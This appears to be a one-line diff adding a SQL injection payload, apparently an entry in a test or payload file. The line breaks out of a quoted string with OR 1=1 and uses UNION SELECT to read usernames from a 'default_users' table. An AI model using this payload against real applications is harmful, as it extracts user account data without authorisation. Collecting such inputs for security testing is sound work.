@@ -1,0 +1,1 @@
+"A"%' OR 1=1) UNION SELECT u.username,u.username,u.username,u.username,u.username FROM default_users u #
